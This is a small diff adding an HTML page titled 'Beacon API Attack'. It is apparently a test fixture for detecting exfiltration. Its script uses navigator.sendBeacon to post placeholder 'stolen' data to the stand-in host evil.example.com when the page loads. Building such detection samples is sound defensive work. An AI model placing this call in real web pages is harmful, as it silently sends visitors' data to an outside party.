@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Beacon API Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: Beacon API for data exfiltration
+    navigator.sendBeacon('https://evil.example.com/beacon', JSON.stringify({ data: 'stolen' }));
+  </script>
+</body>
+</html>
